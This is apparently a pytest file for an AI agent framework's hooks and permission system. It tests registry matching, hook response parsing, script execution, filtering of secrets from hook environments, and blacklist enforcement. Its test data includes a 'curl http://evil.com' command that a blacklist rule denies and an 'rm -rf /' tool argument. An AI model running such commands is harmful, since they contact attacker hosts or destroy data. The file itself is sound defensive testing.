"""Unit tests for the hooks system."""

from __future__ import annotations

import asyncio
import os
import stat
from pathlib import Path

import pytest

from ms_agent.hooks.events import HookResult
from ms_agent.hooks.executor import HookExecutor
from ms_agent.hooks.executors.command import HookExecutionContext
from ms_agent.hooks.permission_resolve import resolve_hook_permission_decision
from ms_agent.hooks.registry import HookRegistry
from ms_agent.hooks.response_adapter import ResponseAdapter
from ms_agent.permission.config import PermissionConfig
from ms_agent.permission.enforcer import PermissionEnforcer
from ms_agent.utils.pattern_matcher import match_pattern

FIXTURES = Path(__file__).parent / 'fixtures' / 'hooks'


class TestPatternMatcher:
    def test_wildcard(self):
        assert match_pattern('file_system---*', 'file_system---read_file')
        assert match_pattern('read_file|write_file', 'read_file')
        assert not match_pattern('a', 'b')

    def test_empty_pattern(self):
        assert not match_pattern('', 'anything')


class TestHookRegistry:
    def test_from_dict(self):
        reg = HookRegistry.from_dict({
            'PreToolUse': [{
                'matcher': 'code_executor---*',
                'hooks': [{'type': 'command', 'command': './hook.sh'}],
            }],
        })
        handlers = reg.get_handlers('PreToolUse', 'code_executor---shell_executor')
        assert len(handlers) == 1
        assert handlers[0].command == './hook.sh'

    def test_unknown_event_warning(self):
        reg = HookRegistry.from_dict({'UnknownEvent': []})
        assert reg.is_empty

    def test_merge(self):
        a = HookRegistry.from_dict({
            'Stop': [{'hooks': [{'type': 'command', 'command': 'a.sh'}]}],
        })
        b = HookRegistry.from_dict({
            'Stop': [{'hooks': [{'type': 'command', 'command': 'b.sh'}]}],
        })
        merged = a.merge(b)
        handlers = merged.get_handlers('Stop')
        assert [h.command for h in handlers] == ['a.sh', 'b.sh']

    def test_non_tool_event_no_matcher(self):
        reg = HookRegistry.from_dict({
            'SessionStart': [{'matcher': 'ignored', 'hooks': [
                {'type': 'command', 'command': 'init.sh'},
            ]}],
        })
        assert len(reg.get_handlers('SessionStart')) == 1

    def test_tool_event_requires_tool_name_for_matcher(self):
        reg = HookRegistry.from_dict({
            'PreToolUse': [{
                'matcher': 'code_executor---*',
                'hooks': [{'type': 'command', 'command': './hook.sh'}],
            }],
        })
        assert reg.get_handlers('PreToolUse', None) == []
        assert len(reg.get_handlers('PreToolUse', 'code_executor---shell_executor')) == 1

    def test_skips_disabled_executor_types(self):
        reg = HookRegistry.from_dict({
            'PreToolUse': [{
                'hooks': [{'type': 'http', 'url': 'https://example.com/hook'}],
            }],
        }, enabled_executors=frozenset({'command'}))
        assert reg.is_empty


class TestResponseAdapter:
    def test_canonical_deny(self):
        r = ResponseAdapter().parse('{"decision": "deny", "reason": "no"}')
        assert r.action == 'deny'

    def test_claude_permission_decision(self):
        r = ResponseAdapter().parse(
            '{"hookSpecificOutput": {"permissionDecision": "allow"}}')
        assert r.action == 'allow'

    def test_updated_args_only_passthrough(self):
        r = ResponseAdapter().parse('{"updatedArgs": {"command": "ls"}}')
        assert r.action == 'pass'
        assert r.updated_args == {'command': 'ls'}

    def test_cursor_permission_deny(self):
        r = ResponseAdapter().parse(
            '{"permission": "deny", "user_message": "nope"}')
        assert r.action == 'deny'
        assert r.reason == 'nope'


class TestHookExecutor:
    @pytest.fixture
    def executor(self, tmp_path):
        return HookExecutor(working_dir=str(tmp_path))

    def test_env_includes_plugin_data_aliases(self, tmp_path):
        from ms_agent.hooks.executors.command import build_hook_env
        plugin_root = tmp_path / 'plugin'
        plugin_data = tmp_path / 'data'
        ctx = HookExecutionContext(
            session_id='s1',
            project_path=str(tmp_path),
            plugin_root=str(plugin_root),
            plugin_data_dir=str(plugin_data),
        )
        env = build_hook_env(ctx)
        assert env['MS_AGENT_PLUGIN_ROOT'] == str(plugin_root)
        assert env['CLAUDE_PLUGIN_ROOT'] == str(plugin_root)
        assert env['MS_AGENT_PLUGIN_DATA'] == str(plugin_data)
        assert env['CLAUDE_PLUGIN_DATA'] == str(plugin_data)

    def test_env_filters_sensitive_parent_variables(self, tmp_path, monkeypatch):
        from ms_agent.hooks.executors.command import build_hook_env

        monkeypatch.setenv('OPENAI_API_KEY', 'sk-secret')
        monkeypatch.setenv('AWS_SECRET_ACCESS_KEY', 'aws-secret')
        monkeypatch.setenv('PATH', '/usr/bin')

        env = build_hook_env(HookExecutionContext(
            session_id='s1',
            project_path=str(tmp_path),
        ))
        assert 'OPENAI_API_KEY' not in env
        assert 'AWS_SECRET_ACCESS_KEY' not in env
        assert env['PATH'] == '/usr/bin'
        assert env['MS_AGENT_PROJECT_DIR'] == str(tmp_path)

    @pytest.mark.asyncio
    async def test_pass_script(self, executor, tmp_path):
        script = FIXTURES / 'pass.py'
        os.chmod(script, script.stat().st_mode | stat.S_IEXEC)
        from ms_agent.hooks.registry import HookHandlerConfig
        handler = HookHandlerConfig(type='command', command=f'python3 {script}')
        ctx = HookExecutionContext(session_id='s1', project_path=str(tmp_path))
        result = await executor.execute(
            handler,
            {'event': 'PreToolUse', 'tool_name': 't', 'tool_args': {}},
            ctx,
        )
        assert result.action == 'pass'

    @pytest.mark.asyncio
    async def test_deny_script(self, executor, tmp_path):
        script = FIXTURES / 'deny.py'
        handler = __import__('ms_agent.hooks.registry', fromlist=['HookHandlerConfig']).HookHandlerConfig(
            type='command', command=f'python3 {script}')
        ctx = HookExecutionContext(session_id='s1', project_path=str(tmp_path))
        result = await executor.execute(
            handler,
            {'event': 'PreToolUse'},
            ctx,
        )
        assert result.action == 'deny'

    @pytest.mark.asyncio
    async def test_exit_2_block(self, executor, tmp_path):
        script = FIXTURES / 'block.sh'
        os.chmod(script, script.stat().st_mode | stat.S_IEXEC)
        from ms_agent.hooks.registry import HookHandlerConfig
        handler = HookHandlerConfig(type='command', command=f'bash {script}')
        ctx = HookExecutionContext(session_id='s1', project_path=str(tmp_path))
        result = await executor.execute(handler, {'event': 'PreToolUse'}, ctx)
        assert result.action == 'deny'

    @pytest.mark.asyncio
    async def test_execute_all_deny_short_circuit(self, executor, tmp_path):
        deny = FIXTURES / 'deny.py'
        allow = FIXTURES / 'allow.py'
        from ms_agent.hooks.registry import HookHandlerConfig
        handlers = [
            HookHandlerConfig(type='command', command=f'python3 {deny}'),
            HookHandlerConfig(type='command', command=f'python3 {allow}'),
        ]
        ctx = HookExecutionContext(session_id='s1', project_path=str(tmp_path))
        result = await executor.execute_all(
            handlers, {'event': 'PreToolUse'}, blockable=True, ctx=ctx)
        assert result.action == 'deny'


class TestResolveHookPermission:
    @pytest.mark.asyncio
    async def test_hook_deny(self):
        out = await resolve_hook_permission_decision(
            HookResult(action='deny', reason='no'),
            't', {},
            permission_enforcer=None,
            permission_config=None,
        )
        assert isinstance(out, str)
        assert 'Blocked by hook' in out

    @pytest.mark.asyncio
    async def test_hook_allow_with_blacklist(self):
        config = PermissionConfig(
            mode='interactive',
            blacklist=('code_executor---shell_executor:curl *',),
        )
        enforcer = PermissionEnforcer(config=config)
        out = await resolve_hook_permission_decision(
            HookResult(action='allow'),
            'code_executor---shell_executor',
            {'command': 'curl http://evil.com'},
            permission_enforcer=enforcer,
            permission_config=config,
        )
        assert out.action == 'deny'

    @pytest.mark.asyncio
    async def test_pass_goes_to_enforcer(self):
        config = PermissionConfig(mode='interactive')
        enforcer = PermissionEnforcer(config=config)
        out = await resolve_hook_permission_decision(
            HookResult(action='pass'),
            'file_system---read_file',
            {'path': '/tmp/x'},
            permission_enforcer=enforcer,
            permission_config=config,
        )
        assert out.action == 'allow'

    @pytest.mark.asyncio
    async def test_hook_allow_with_ask_rule(self):
        from ms_agent.hooks.permission_resolve import check_rule_based_permissions

        config = PermissionConfig(
            mode='interactive',
            blacklist=(),
            ask_rules=('file_system---read_file:/secret/*',),
        )
        rule = await check_rule_based_permissions(
            'file_system---read_file',
            {'path': '/secret/data.txt'},
            config,
        )
        assert rule is not None


class TestPluginHookPayloadCompat:
    def test_plugin_compat_payload_uses_claude_tool_name(self):
        from ms_agent.hooks.executors.command import (
            HookExecutionContext,
            plugin_compat_payload,
        )

        ctx = HookExecutionContext(
            session_id='s1',
            project_path='/tmp/project',
            plugin_root='/tmp/plugins/hookify',
        )
        payload = plugin_compat_payload(
            {
                'event': 'PreToolUse',
                'tool_name': 'code_executor---shell_executor',
                'tool_name_claude': 'Bash',
                'tool_args': {'command': 'rm -rf /'},
            },
            ctx,
        )
        assert payload['tool_name'] == 'Bash'
        assert payload['hook_event_name'] == 'PreToolUse'
